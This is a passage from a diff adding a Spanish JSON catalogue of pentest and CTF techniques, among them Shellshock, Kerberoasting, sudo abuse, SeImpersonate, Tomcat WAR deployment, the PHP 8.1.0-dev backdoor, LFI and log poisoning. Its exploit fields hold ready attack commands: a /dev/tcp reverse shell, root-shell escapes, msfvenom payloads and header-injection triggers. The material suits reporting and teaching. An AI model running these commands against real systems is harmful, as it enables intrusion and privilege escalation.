+   "Entra por CGI (cabeceras HTTP), DHCP, SSH forzado, etc.",
+   "No requiere autenticación cuando hay un CGI vulnerable.",
+   "Afecta a versiones de Bash anteriores a los parches de 2014.",
+   "Explotación trivial con una cabecera manipulada."
+  ],
+  "amenaza": "Es un RCE remoto preautenticación que afectó a una cantidad enorme de servidores y dispositivos. La explotación por CGI es trivial: basta una cabecera HTTP maliciosa. Fue objeto de escaneo y explotación masiva. El riesgo es inmediato en cualquier CGI que invoque bash.",
+  "impacto": "La ejecución ocurre con los privilegios del proceso (a menudo el usuario del servidor web). Desde ahí se enumera y se escala. Compromete confidencialidad e integridad del servidor. Suele ser el foothold de la máquina.",
+  "rec": "Localizar scripts CGI (/cgi-bin/) y detectar que el backend es bash.",
+  "conf": "Enviar <code>() { :;}; echo; /bin/id</code> en la cabecera User-Agent y ver si ejecuta.",
+  "expl": "Sustituir el comando por una reverse shell (<code>() { :;}; /bin/bash -i &gt;&amp; /dev/tcp/IP/PUERTO 0&gt;&amp;1</code>) con curl."
+ },
+ "Kerberoasting": {
+  "ref": "https://attack.mitre.org/techniques/T1558/003/",
+  "sev": "medium",
+  "intro": "Pedir tickets de servicio (TGS) de cuentas con SPN; el ticket va cifrado con el hash de la cuenta y se craquea offline.",
+  "points": [
+   "Cualquier usuario autenticado del dominio puede solicitar los TGS.",
+   "El cifrado RC4 del ticket se craquea offline sin tocar al DC.",
+   "Afecta a cuentas de servicio con SPN y contraseña débil.",
+   "No genera bloqueos de cuenta (el crackeo es local)."
+  ],
+  "amenaza": "Es una técnica estándar de Active Directory que solo requiere ser usuario del dominio. Las cuentas de servicio suelen tener contraseñas antiguas y débiles, y a menudo privilegios altos. El crackeo es offline, así que es sigiloso y no dispara bloqueos. El riesgo depende de la fortaleza de las contraseñas de servicio.",
+  "impacto": "La recompensa son credenciales en claro de cuentas de servicio, a veces administrativas en el dominio. Con ellas hay movimiento lateral y escalada. El impacto escala si la cuenta es privilegiada (SQL, administradores). Es una de las vías más rentables en AD.",
+  "rec": "Enumerar cuentas con SPN (<code>GetUserSPNs.py</code> de Impacket, o PowerView).",
+  "conf": "Solicitar los TGS de esas cuentas y comprobar que salen en formato crackeable ($krb5tgs$).",
+  "expl": "Craquear el ticket con hashcat (modo 13100) y usar la contraseña recuperada."
+ },
+ "Directory Traversal": {
+  "ref": "https://owasp.org/www-community/attacks/Path_Traversal",
+  "sev": "high",
+  "intro": "Rutas con ../ o absolutas que no se filtran, permitiendo salir del directorio previsto para leer o escribir ficheros arbitrarios.",
+  "points": [
+   "El punto de entrada es un parámetro o nombre de fichero sin sanear.",
+   "En lectura, expone ficheros sensibles del servidor.",
+   "En escritura, coloca ficheros fuera de la carpeta esperada.",
+   "Combinado con otras piezas, puede acabar en RCE o escalada."
+  ],
+  "amenaza": "El impacto varía mucho según si se puede leer o escribir y dónde. Una lectura arbitraria filtra configuraciones y credenciales; una escritura controlada puede dar ejecución de código o escalada. Es un patrón muy común y fácil de probar. El riesgo sube cuando el proceso vulnerable corre como root.",
+  "impacto": "Según el contexto, va de fuga de información a control total de la máquina. Leer /etc/passwd o ficheros de configuración prepara el siguiente paso. Escribir una authorized_keys o una webshell da acceso directo. El alcance depende de los permisos del proceso afectado.",
+  "rec": "Identificar parámetros que referencian ficheros o nombres de fichero controlables.",
+  "conf": "Probar secuencias <code>../</code> o rutas absolutas y ver si se sale del directorio.",
+  "expl": "Leer un fichero sensible para confirmar, o escribir fuera del directorio (p. ej. una clave SSH) si hay escritura con privilegios."
+ },
+ "Abuso de sudo": {
+  "ref": "https://gtfobins.github.io/",
+  "sev": "high",
+  "intro": "Reglas de sudo mal puestas: ejecutar un binario como root sin contraseña, o un programa que permite escapar a una shell.",
+  "points": [
+   "Se descubre con <code>sudo -l</code>.",
+   "Muchos binarios permiten romper a shell (ver GTFOBins).",
+   "A veces sin pedir contraseña (NOPASSWD).",
+   "Incluye comodines y variables como LD_PRELOAD mal restringidas."
+  ],
+  "amenaza": "Es la vía de escalada local más habitual en Linux. Casi cualquier binario permitido por sudo tiene un truco en GTFOBins para saltar a una shell de root. No requiere exploits ni condiciones especiales, solo una regla mal pensada. El riesgo es alto porque el fallo es de configuración, no de software.",
+  "impacto": "El resultado es ejecución de comandos como root, es decir, control total de la máquina. Desde ahí se lee cualquier fichero y se persiste. En una cadena, suele ser el paso final a root. El impacto es la toma completa del host.",
+  "rec": "Ejecutar <code>sudo -l</code> para ver qué se puede correr como root.",
+  "conf": "Buscar el binario permitido en GTFOBins para ver si tiene técnica de escape.",
+  "expl": "Aplicar la técnica (p. ej. <code>sudo less /etc/profile</code> y <code>!/bin/sh</code>, o <code>sudo vim -c ':!sh'</code>) para obtener shell de root."
+ },
+ "Webshell expuesta en la raíz web": {
+  "ref": "https://owasp.org/www-community/attacks/Code_Injection",
+  "sev": "high",
+  "intro": "Una webshell (p. ej. phpbash) dejada accesible en el directorio web, sin autenticación.",
+  "points": [
+   "Suele quedar por un despliegue o una prueba olvidada.",
+   "Se encuentra fuzzeando directorios/ficheros.",
+   "Ejecuta comandos directamente desde el navegador.",
+   "No requiere explotar ninguna vulnerabilidad de código."
+  ],
+  "amenaza": "Es un punto de entrada directo: quien la encuentra ejecuta comandos sin explotar nada. Aparece por descuidos de desarrollo o pruebas que no se limpian. El fuzzing de directorios la descubre rápido. El riesgo es alto porque es RCE «de regalo».",
+  "impacto": "La ejecución ocurre como el usuario del servidor web. Desde ahí se enumera y se prepara la escalada. Compromete el servidor por completo. Suele ser el foothold de la máquina.",
+  "rec": "Fuzzear directorios y ficheros (gobuster/ffuf/dirsearch) buscando shells conocidas.",
+  "conf": "Abrir la ruta y comprobar que ejecuta un comando (<code>id</code>).",
+  "expl": "Usarla para lanzar una reverse shell hacia tu listener."
+ },
+ "Tarea cron de root sobre un directorio ajeno": {
+  "ref": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs",
+  "sev": "high",
+  "intro": "Un cron de root que opera (comodines, scripts) sobre ficheros de un directorio escribible por el usuario.",
+  "points": [
+   "Se descubre leyendo /etc/crontab o monitorizando procesos (pspy).",
+   "El fallo es el script o el directorio escribible, no el cron en sí.",
+   "Los comodines (*) en tar/chown son un vector clásico (wildcard injection).",
+   "Se ejecuta periódicamente como root."
+  ],
+  "amenaza": "Es una escalada fiable y silenciosa: basta con dejar la trampa y esperar a que salte la tarea. Aparece por scripts de mantenimiento mal protegidos. No requiere exploits. El riesgo es alto cuando el usuario puede escribir en lo que el cron toca.",
+  "impacto": "El resultado es ejecución de código como root. Desde ahí, control total del equipo. Suele ser el paso final de una cadena. El impacto es la toma completa del host.",
+  "rec": "Enumerar crons (<code>cat /etc/crontab</code>) y vigilar procesos con <code>pspy</code>.",
+  "conf": "Comprobar permisos de escritura sobre el script o su directorio.",
+  "expl": "Modificar el script (o abusar del comodín) para que, al ejecutarse el cron, cree una bash SUID o una reverse shell de root."
+ },
+ "Credenciales en claro en un plugin descargable": {
+  "ref": "https://cwe.mitre.org/data/definitions/522.html",
+  "sev": "medium",
+  "intro": "Un plugin o fichero descargable del servidor contiene credenciales en texto plano.",
+  "points": [
+   "El fichero es accesible y descargable sin autenticación.",
+   "Guarda usuario/contraseña en claro o fácilmente reversibles.",
+   "A menudo son credenciales reutilizadas en otros servicios.",
+   "Mala gestión de secretos en el despliegue."
+  ],
+  "amenaza": "No hace falta explotar nada: basta con descargar el fichero y leerlo. El problema es la mala gestión de secretos. El impacto crece si esas credenciales valen para SSH u otros usuarios. El riesgo es medio-alto por la reutilización habitual.",
+  "impacto": "La exposición es de credenciales que abren accesos directos. Con ellas se entra a paneles, bases de datos o por SSH. Suele habilitar movimiento lateral. El alcance depende de dónde sirvan esas credenciales.",
+  "rec": "Descargar los plugins/ficheros accesibles y revisarlos (<code>strings</code>, grep de «pass»).",
+  "conf": "Localizar las credenciales en claro dentro del fichero.",
+  "expl": "Probarlas en los servicios disponibles (SSH, panel, BD) para acceder."
+ },
+ "Reutilización de credenciales": {
+  "ref": "https://owasp.org/www-community/attacks/Credential_stuffing",
+  "sev": "high",
+  "intro": "La misma contraseña vale para varios servicios o usuarios (base de datos, panel, SSH…).",
+  "points": [
+   "Una credencial filtrada se prueba en todos los servicios.",
+   "Afecta a usuarios que repiten contraseña.",
+   "Permite saltar de un servicio a una cuenta del sistema.",
+   "No requiere explotar vulnerabilidades de software."
+  ],
+  "amenaza": "Cose cadenas enteras: una filtración puntual se convierte en movimiento lateral y escalada. Es extremadamente común porque la gente reutiliza contraseñas. No necesita exploits, solo probar. El riesgo es alto por lo barato y efectivo que resulta.",
+  "impacto": "Con una sola credencial se encadenan accesos entre servicios y usuarios. Suele ser lo que convierte un foothold en escalada. Compromete cuentas que, por separado, parecían seguras. El impacto depende de hasta dónde llegue la contraseña.",
+  "rec": "Recopilar todas las credenciales obtenidas (ficheros, BD, históricos).",
+  "conf": "Identificar usuarios del sistema (/etc/passwd) o cuentas de otros servicios.",
+  "expl": "Probar cada contraseña en SSH y en los paneles disponibles hasta encontrar reutilización."
+ },
+ "Subida de ficheros": {
+  "ref": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
+  "sev": "high",
+  "intro": "Un formulario de subida no valida tipo, extensión o ruta, permitiendo colocar un fichero ejecutable (webshell).",
+  "points": [
+   "Fallan las comprobaciones de extensión/MIME o la ruta de guardado.",
+   "Se sube una webshell y se navega a su URL.",
+   "A veces hay que saltar filtros (doble extensión, .phtml, Content-Type).",
+   "Suele requerir una sesión válida (autenticado)."
+  ],
+  "amenaza": "Es una de las vías de RCE web más comunes y, a menudo, basta una sesión normal. Los filtros suelen ser débiles y evitables. Da ejecución directa de código en el servidor. El riesgo es alto en aplicaciones con subidas mal controladas.",
+  "impacto": "La ejecución ocurre como el usuario del servidor web. Desde ahí se enumera y se escala. Compromete la aplicación y el servidor. Suele ser el foothold de la máquina.",
+  "rec": "Localizar funcionalidades de subida (avatares, adjuntos, imports).",
+  "conf": "Probar a subir un fichero ejecutable y comprobar dónde queda accesible.",
+  "expl": "Saltar los filtros si hace falta (extensiones alternativas, Content-Type) y ejecutar la webshell para reverse shell."
+ },
+ "SeImpersonatePrivilege": {
+  "ref": "https://attack.mitre.org/techniques/T1134/",
+  "sev": "high",
+  "intro": "Una cuenta de servicio con el privilegio SeImpersonate puede suplantar el token de un cliente más privilegiado (familia «Potato»).",
+  "points": [
+   "Afecta a cuentas de servicio (IIS, MSSQL) con SeImpersonatePrivilege.",
+   "Herramientas: JuicyPotato, RoguePotato, PrintSpoofer, GodPotato.",
+   "Fuerza a un proceso privilegiado a autenticarse y roba su token.",
+   "Resultado: SYSTEM."
+  ],
+  "amenaza": "Es la escalada estándar en servidores Windows tras caer como cuenta de servicio. El privilegio SeImpersonate está casi siempre en esas cuentas. Hay varias herramientas fiables según la versión. El riesgo es alto porque el foothold de servicios web suele tenerlo.",
+  "impacto": "El resultado es SYSTEM: control total del equipo. Permite volcado de credenciales y persistencia. Convierte la máquina en pivote de confianza. El impacto es la toma completa del host.",
+  "rec": "Comprobar privilegios con <code>whoami /priv</code> y ver SeImpersonatePrivilege habilitado.",
+  "conf": "Identificar la versión de Windows para elegir la herramienta (PrintSpoofer/GodPotato en versiones modernas).",
+  "expl": "Ejecutar la herramienta (<code>PrintSpoofer.exe -i -c cmd</code>) para abrir una shell como SYSTEM."
+ },
+ "IDOR / Broken Access Control": {
+  "ref": "https://portswigger.net/web-security/access-control/idor",
+  "sev": "medium",
+  "intro": "Referencias directas a objetos (IDs, rutas) sin comprobar permisos, accediendo a datos o funciones de otros usuarios.",
+  "points": [
+   "Se manipula un identificador (id=1 → id=2) o una ruta.",
+   "El servidor no valida que el objeto sea tuyo.",
+   "Expone datos o acciones de otros usuarios.",
+   "No requiere romper autenticación, solo autorización."
+  ],
+  "amenaza": "Es un fallo de control de acceso muy común y fácil de probar. Basta cambiar un identificador para ver lo que no debes. No necesita herramientas sofisticadas. El riesgo depende de qué objetos queden expuestos.",
+  "impacto": "La exposición es de información o funciones sensibles de otros usuarios. Puede filtrar datos personales, capturas de red, documentos, etc. En algunos casos permite acciones privilegiadas. El alcance depende de los objetos accesibles.",
+  "rec": "Identificar parámetros que referencian objetos (IDs, nombres de fichero, rutas).",
+  "conf": "Cambiar el identificador por otro y ver si devuelve datos ajenos.",
+  "expl": "Enumerar los identificadores válidos (fuerza bruta/secuencial) para extraer toda la información accesible."
+ },
+ "Capability cap_setuid sobre Python": {
+  "ref": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities",
+  "sev": "high",
+  "intro": "Un binario (python) con la capability cap_setuid permite cambiar el UID del proceso a 0.",
+  "points": [
+   "Se descubre con <code>getcap -r / 2&gt;/dev/null</code>.",
+   "cap_setuid+ep sobre python/perl es escalada directa.",
+   "No requiere exploits ni contraseñas.",
+   "Equivale a tener setuid root sobre ese intérprete."
+  ],
+  "amenaza": "Es una escalada inmediata y fiable cuando aparece. Las capabilities se asignan a veces sin entender su alcance. No requiere nada más que invocar el intérprete. El riesgo es alto porque es un camino directo a root.",
+  "impacto": "El resultado es una shell como root: control total del equipo. Desde ahí se lee cualquier fichero y se persiste. Suele ser el paso final de la cadena. El impacto es la toma completa del host.",
+  "rec": "Listar capabilities del sistema con <code>getcap -r / 2&gt;/dev/null</code>.",
+  "conf": "Ver un intérprete (python/perl) con cap_setuid+ep.",
+  "expl": "Ejecutar <code>python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'</code> para shell de root."
+ },
+ "FTP anónimo": {
+  "ref": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp",
+  "sev": "medium",
+  "intro": "Servicio FTP que permite acceso anónimo, a veces con lectura o escritura sobre rutas sensibles (el webroot o todo el sistema).",
+  "points": [
+   "Se entra con usuario «anonymous» y cualquier contraseña.",
+   "Puede dar lectura de ficheros o escritura en carpetas sensibles.",
+   "Si escribe en el webroot, permite subir una webshell.",
+   "Si expone el sistema de ficheros, filtra información o credenciales."
+  ],
+  "amenaza": "La exposición es directa: sin credenciales se accede al servicio. El impacto depende de qué permita leer o escribir. Con escritura sobre el webroot se consigue RCE; con lectura amplia, fuga de datos. El riesgo sube mucho cuando hay escritura.",
+  "impacto": "En lectura, filtra ficheros sensibles y prepara el siguiente paso. En escritura sobre el webroot, da ejecución remota subiendo código. Si cubre todo el FS, expone configuraciones y credenciales. El alcance lo marca lo que el FTP deje tocar.",
+  "rec": "Conectar como anónimo (<code>ftp &lt;host&gt;</code>, usuario anonymous) y listar.",
+  "conf": "Comprobar permisos: descargar ficheros y probar a subir uno (<code>put</code>).",
+  "expl": "Si hay escritura sobre el webroot, subir una webshell y ejecutarla; si solo hay lectura, descargar lo sensible."
+ },
+ "Credenciales por defecto": {
+  "ref": "https://cwe.mitre.org/data/definitions/1392.html",
+  "sev": "high",
+  "intro": "Servicios con las credenciales de fábrica o por defecto sin cambiar (Tomcat Manager, dispositivos, paneles…).",
+  "points": [
+   "Se prueban pares conocidos (admin/admin, tomcat/s3cret…).",
+   "Afecta a paneles de administración expuestos.",
+   "No requiere explotar vulnerabilidades.",
+   "Da acceso administrativo al servicio."
+  ],
+  "amenaza": "Es trivial: probar los pares conocidos abre el panel. Aparece por despliegues sin endurecer. A menudo el acceso administrativo lleva directo a RCE (desplegar apps, cargar plugins). El riesgo es alto por lo fácil y lo que habilita.",
+  "impacto": "El acceso es administrativo al servicio afectado. Según el producto, eso significa desplegar código, leer datos o pivotar. En Tomcat/Jenkins suele ser RCE directo. El impacto depende del servicio, pero suele ser alto.",
+  "rec": "Identificar el servicio y su panel (Tomcat Manager en /manager/html, etc.).",
+  "conf": "Probar las credenciales por defecto documentadas del producto.",
+  "expl": "Con acceso de admin, usar la función de despliegue/carga para ejecutar código."
+ },
+ "Despliegue de WAR (Tomcat)": {
+  "ref": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat",
+  "sev": "high",
+  "intro": "El acceso al Tomcat Manager permite desplegar una aplicación WAR maliciosa que da ejecución de código.",
+  "points": [
+   "Requiere credenciales del Tomcat Manager.",
+   "Se sube un .war con una JSP webshell.",
+   "El código corre con los privilegios del servicio Tomcat.",
+   "En Windows, el servicio suele ir como SYSTEM."
+  ],
+  "amenaza": "Con credenciales del Manager (a menudo por defecto), el RCE es de un paso. Es una técnica muy conocida y fiable. En Windows, el servicio suele correr como SYSTEM, así que el foothold ya es administrativo. El riesgo es alto cuando el Manager es accesible.",
+  "impacto": "La ejecución ocurre con la cuenta del servicio Tomcat; en Windows, SYSTEM. Eso da control del servidor de aplicaciones y, a menudo, del host. Compromete las aplicaciones desplegadas y sus datos. Suele ser foothold y escalada a la vez.",
+  "rec": "Detectar Tomcat y acceder a /manager/html (requiere credenciales).",
+  "conf": "Comprobar que el rol permite desplegar (manager-gui/manager-script).",
+  "expl": "Generar un WAR con msfvenom (<code>msfvenom -p java/jsp_shell_reverse_tcp ... -f war</code>), desplegarlo y navegar a su ruta."
+ },
+ "El servicio corre como SYSTEM": {
+  "ref": "https://cwe.mitre.org/data/definitions/250.html",
+  "sev": "medium",
+  "intro": "El servicio comprometido (p. ej. Tomcat) se ejecuta con la cuenta SYSTEM/root en lugar de una cuenta restringida.",
+  "points": [
+   "Es una mala configuración de privilegios, no un bug de software.",
+   "Hace que cualquier RCE del servicio sea ya administrativo.",
+   "Elimina la necesidad de una fase de escalada.",
+   "Común en servicios instalados con la cuenta por defecto."
+  ],
+  "amenaza": "No es una vulnerabilidad explotable por sí sola, sino lo que convierte un RCE normal en toma total. Aparece por instalar servicios con la cuenta más privilegiada. Amplifica el impacto de cualquier otro fallo del servicio. El riesgo es el del RCE que lo acompaña, pero elevado al máximo.",
+  "impacto": "El foothold ya es administrador (SYSTEM/root), sin escalar. Eso da control inmediato del equipo. Compromete todo lo que el host contiene. El impacto es máximo en cuanto se logra ejecución en el servicio.",
+  "rec": "Comprobar con qué cuenta corre el servicio (<code>whoami</code> tras el RCE, o la configuración del servicio).",
+  "conf": "Verificar que es SYSTEM/root y no una cuenta restringida.",
+  "expl": "Aprovechar el RCE del servicio directamente: la shell obtenida ya es administrativa."
+ },
+ "Backdoor en PHP 8.1.0-dev (User-Agentt → RCE)": {
+  "ref": "https://www.exploit-db.com/exploits/49933",
+  "sev": "critical",
+  "intro": "La rama 8.1.0-dev de PHP se publicó con una puerta trasera: una cabecera «User-Agentt» ejecuta código.",
+  "points": [
+   "Afecta a servidores que corren el build 8.1.0-dev comprometido.",
+   "Se dispara con la cabecera HTTP «User-Agentt» (doble t).",
+   "RCE remoto sin autenticación.",
+   "Es un caso de compromiso de la cadena de suministro."
+  ],
+  "amenaza": "Es un RCE preautenticación trivial: una cabecera y listo. Nació de un compromiso del repositorio de PHP. Los exploits son públicos y de una sola petición. El riesgo es inmediato si el servidor corre ese build.",
+  "impacto": "La ejecución ocurre con los privilegios del servidor web. Desde ahí se enumera y se escala. Compromete el servidor por completo. Suele ser el foothold de la máquina.",
+  "rec": "Detectar PHP 8.1.0-dev en las cabeceras (X-Powered-By).",
+  "conf": "Enviar <code>User-Agentt: zerodiumsystem(\"id\");</code> y ver la salida.",
+  "expl": "Sustituir por una reverse shell en la cabecera, o usar el exploit de ExploitDB 49933."
+ },
+ "SSRF en el «Free File Scanner» de staging": {
+  "ref": "https://portswigger.net/web-security/ssrf",
+  "sev": "medium",
+  "intro": "La aplicación hace peticiones a URLs que controla el atacante (Server-Side Request Forgery).",
+  "points": [
+   "Un parámetro acepta una URL que el servidor consulta.",
+   "Permite alcanzar servicios internos no expuestos (localhost, red interna).",
+   "Puede leer respuestas de paneles internos.",
+   "Sirve para descubrir y pivotar hacia servicios ocultos."
+  ],
+  "amenaza": "Convierte al servidor en un proxy hacia su red interna. Expone paneles y APIs que no son accesibles desde fuera. Es la vía para encontrar el siguiente eslabón de la cadena. El riesgo depende de qué haya detrás accesible internamente.",
+  "impacto": "La exposición es de servicios internos y, a través de ellos, de nuevas vulnerabilidades. Puede revelar paneles de administración en localhost. Permite pivotar hacia componentes que se creían protegidos. El alcance depende de la red interna alcanzable.",
+  "rec": "Identificar parámetros que reciben una URL o un host.",
+  "conf": "Apuntar a un recurso tuyo (o a <code>http://127.0.0.1</code>) y ver si el servidor hace la petición.",
+  "expl": "Enumerar puertos/servicios internos a través del SSRF para encontrar paneles explotables."
+ },
+ "AlwaysInstallElevated": {
+  "ref": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated",
+  "sev": "high",
+  "intro": "Dos políticas de Windows que hacen que los paquetes MSI se instalen con privilegios de SYSTEM para cualquier usuario.",
+  "points": [
+   "Requiere las claves AlwaysInstallElevated a 1 en HKLM y HKCU.",
+   "Cualquier usuario puede instalar un MSI como SYSTEM.",
+   "Mala configuración, no un bug.",
+   "Escalada local fiable con msfvenom."
+  ],
+  "amenaza": "Es una mala configuración que regala la escalada. Si las dos claves están a 1, un MSI malicioso corre como SYSTEM. No requiere exploits, solo generar e instalar el paquete. El riesgo es alto donde esa política esté activa.",
+  "impacto": "El resultado es SYSTEM: control total del equipo. Permite volcado de credenciales y persistencia. Convierte la máquina en pivote. El impacto es la toma completa del host.",
+  "rec": "Consultar las claves de registro (<code>reg query HKLM\\...\\Installer /v AlwaysInstallElevated</code> y HKCU).",
+  "conf": "Confirmar que ambas valen 1.",
+  "expl": "Generar un MSI con msfvenom (<code>-f msi</code>) e instalarlo con <code>msiexec /quiet /i evil.msi</code> para shell como SYSTEM."
+ },
+ "Panel de Pi-hole publicado sin autenticación": {
+  "ref": "https://cwe.mitre.org/data/definitions/306.html",
+  "sev": "medium",
+  "intro": "El panel de administración (Pi-hole) queda accesible sin pedir contraseña.",
+  "points": [
+   "Falta de autenticación en una interfaz de administración.",
+   "Cualquiera que llegue al panel lo controla.",
+   "Según versión, abre vías a ejecución de comandos.",
+   "Mala configuración de exposición."
+  ],
+  "amenaza": "Una interfaz de administración sin autenticación es un riesgo directo. Da control del servicio a quien la encuentre. Según la versión, el panel ha tenido vías a RCE. El riesgo depende de qué permita hacer el panel.",
+  "impacto": "La exposición es del control del servicio y su configuración. Puede revelar información de red y, en algunas versiones, llevar a ejecución de comandos. Habilita manipular el DNS de la red. El alcance depende de la versión y del propio panel.",
+  "rec": "Acceder al panel de administración y ver si pide autenticación.",
+  "conf": "Confirmar que se llega a funciones de administración sin credenciales.",
+  "expl": "Usar las funciones del panel (o un exploit de la versión concreta) para escalar o ejecutar comandos."
+ },
+ "Datos borrados recuperables en el disco": {
+  "ref": "https://cwe.mitre.org/data/definitions/212.html",
+  "sev": "low",
+  "intro": "Ficheros borrados que siguen presentes en el soporte (USB, disco) y se recuperan con análisis forense.",
+  "points": [
+   "Borrar no sobrescribe los datos del soporte.",
+   "Herramientas forenses recuperan lo «eliminado».",
+   "Afecta a imágenes de disco/USB accesibles.",
+   "Mala higiene de datos (no hay borrado seguro)."
+  ],
+  "amenaza": "El riesgo es que lo borrado sigue ahí hasta que se sobrescribe. Con acceso al soporte o a su imagen, se recupera. Es una cuestión de higiene de datos más que de un bug. El impacto depende de qué se recupere.",
+  "impacto": "La exposición es de datos sensibles que se creían eliminados (credenciales, documentos, flags). Puede revelar información clave para el siguiente paso. No afecta a disponibilidad, solo a confidencialidad. El alcance lo marca el contenido recuperado.",
+  "rec": "Obtener la imagen de disco/USB o acceso al soporte.",
+  "conf": "Analizarla con herramientas forenses (binwalk, foremost, photorec, testdisk).",
+  "expl": "Recuperar los ficheros borrados y extraer la información sensible."
+ },
+ "Credenciales en los backups de PRTG + patrón predecible": {
+  "ref": "https://cwe.mitre.org/data/definitions/522.html",
+  "sev": "medium",
+  "intro": "Los backups de configuración de PRTG guardan credenciales, y la contraseña sigue un patrón predecible (basado en el año).",
+  "points": [
+   "Los ficheros .dat de backup contienen credenciales antiguas.",
+   "La contraseña guardada sigue un patrón (p. ej. termina en el año).",
+   "Los backups suelen ser accesibles por FTP/SMB o en disco.",
+   "Permite deducir la contraseña actual."
+  ],
+  "amenaza": "Los secretos en backups accesibles son un riesgo clásico. Si además la contraseña sigue un patrón, basta ajustar el año para acertar la actual. Lleva directamente al RCE autenticado del producto. El riesgo es medio-alto por lo fácil de deducir.",
+  "impacto": "La exposición es de credenciales de administrador del panel de PRTG. Con ellas se consigue el RCE autenticado del producto (SYSTEM). Compromete el servidor de monitorización y su visibilidad de red. El alcance se amplía a toda la red monitorizada.",
+  "rec": "Localizar los backups de configuración de PRTG (ficheros .dat, por FTP/SMB o en el disco).",
+  "conf": "Leer las credenciales guardadas y detectar el patrón (año) de la contraseña.",
+  "expl": "Deducir la contraseña actual ajustando el patrón y entrar al panel."
+ },
+ "Information Disclosure": {
+  "ref": "https://cwe.mitre.org/data/definitions/200.html",
+  "sev": "medium",
+  "intro": "El sistema expone información sensible (historial de commits, ficheros, mensajes) que no debería ser pública.",
+  "points": [
+   "Secretos en historiales de Git, backups, comentarios o errores.",
+   "Un secreto subido y luego «borrado» sigue en el historial.",
+   "Revela credenciales, rutas internas o subdominios.",
+   "No requiere explotar nada, solo mirar donde no se espera."
+  ],
+  "amenaza": "Suele ser el detonante de cadenas largas: una fuga aparentemente menor abre la siguiente puerta. Los historiales de Git y los backups son fuentes habituales. No necesita herramientas, solo revisar con cuidado. El riesgo depende de qué se filtre.",
+  "impacto": "La exposición es de credenciales, rutas o subdominios internos. Con ello se descubren nuevos puntos de entrada y accesos. A menudo habilita reutilización de credenciales. El alcance depende del secreto concreto.",
+  "rec": "Revisar fuentes de fuga: historial de Git, backups, comentarios HTML, mensajes de error, metadatos.",
+  "conf": "Encontrar el dato sensible (credencial, subdominio, ruta).",
+  "expl": "Usarlo para acceder al siguiente recurso (login, subdominio, servicio interno)."
+ },
+ "Credenciales débiles y bypass del bloqueo por IP": {
+  "ref": "https://owasp.org/www-community/attacks/Brute_force_attack",
+  "sev": "medium",
+  "intro": "Contraseñas débiles sumadas a un bloqueo por IP que se evita falseando la cabecera X-Forwarded-For.",
+  "points": [
+   "El login limita intentos por IP de origen.",
+   "La IP se toma de X-Forwarded-For, que el cliente controla.",
+   "Rotando esa cabecera se evita el bloqueo.",
+   "Con contraseñas débiles, la fuerza bruta acaba acertando."
+  ],
+  "amenaza": "El control anti-fuerza-bruta es inservible si se puede falsear la IP de origen. Con contraseñas débiles, probar hasta acertar es cuestión de tiempo. Es un fallo combinado de diseño y de política de contraseñas. El riesgo es medio porque requiere algo de automatización.",
+  "impacto": "La exposición es el acceso por fuerza bruta al servicio. Con una cuenta válida se entra al panel o a la aplicación. Puede habilitar RCE o acceso a datos según el servicio. El alcance depende de lo que haya tras el login.",
+  "rec": "Detectar el bloqueo por IP y que la IP se lee de X-Forwarded-For.",
+  "conf": "Comprobar que cambiando la cabecera se resetea el contador de intentos.",
+  "expl": "Automatizar la fuerza bruta rotando X-Forwarded-For (Burp Intruder / script) con un diccionario."
+ },
+ "Local File Inclusion (LFI)": {
+  "ref": "https://book.hacktricks.xyz/pentesting-web/file-inclusion",
+  "sev": "high",
+  "intro": "Un parámetro incluye ficheros del servidor sin filtrar la ruta.",
+  "points": [
+   "Un parámetro (page=, file=) se usa en include/require sin sanear.",
+   "Permite leer ficheros sensibles del servidor.",
+   "Con wrappers (php://filter) se extrae el código fuente.",
+   "Con log poisoning u otros trucos escala a RCE."
+  ],
+  "amenaza": "Es un fallo web común que va de lectura de ficheros a ejecución de código. La lectura ya filtra configuraciones y credenciales; combinado con logs o wrappers, da RCE. Es fácil de probar y muy rentable. El riesgo sube según lo que se pueda incluir.",
+  "impacto": "La exposición inicial es de ficheros sensibles (configuración, /etc/passwd, código). Escalado, da ejecución remota de código. Compromete la confidencialidad y, potencialmente, el control del servidor. El alcance depende de los trucos aplicables.",
+  "rec": "Identificar parámetros que cargan ficheros/plantillas.",
+  "conf": "Probar <code>?page=/etc/passwd</code> o <code>../</code> y ver si incluye el fichero.",
+  "expl": "Leer código con <code>php://filter/convert.base64-encode/resource=</code>, o escalar a RCE vía log poisoning."
+ },
+ "Path Traversal y php://filter": {
+  "ref": "https://book.hacktricks.xyz/pentesting-web/file-inclusion",
+  "sev": "medium",
+  "intro": "Combinación de salto de ruta con los wrappers de PHP (php://filter) para leer o transformar ficheros.",
+  "points": [
+   "Se encadena con un LFI/inclusión controlable.",
+   "php://filter codifica el fichero (base64) para extraerlo entero.",
+   "Permite leer el código fuente de la aplicación.",
+   "Revela credenciales y lógica interna."
+  ],
+  "amenaza": "Amplía un LFI para extraer el código fuente y los secretos del servidor. Al codificar en base64 evita que PHP interprete el fichero. Es un paso habitual para entender la app y encontrar más fallos. El riesgo es medio porque es, sobre todo, lectura.",
+  "impacto": "La exposición es del código fuente y de ficheros sensibles. Con el código se encuentran credenciales, rutas y nuevas vulnerabilidades. Prepara pasos posteriores (RCE). El alcance depende de qué ficheros se puedan leer.",
+  "rec": "Partir de un parámetro de inclusión controlable.",
+  "conf": "Probar <code>php://filter/convert.base64-encode/resource=index.php</code> y decodificar la salida.",
+  "expl": "Enumerar y descargar los ficheros fuente para buscar credenciales y vías de RCE."
+ },
+ "Log Poisoning → RCE": {
+  "ref": "https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi2rce-via-apache-nginx-log-file",
+  "sev": "high",
+  "intro": "Inyectar código en un log (p. ej. en el User-Agent) y luego incluir ese log mediante un LFI para ejecutarlo.",
+  "points": [
+   "Requiere un LFI que pueda incluir el fichero de log.",
+   "Se inyecta PHP en un campo que el servidor registra (User-Agent).",
+   "Al incluir el log vía LFI, el PHP se ejecuta.",
+   "Convierte una lectura de ficheros en RCE."
+  ],
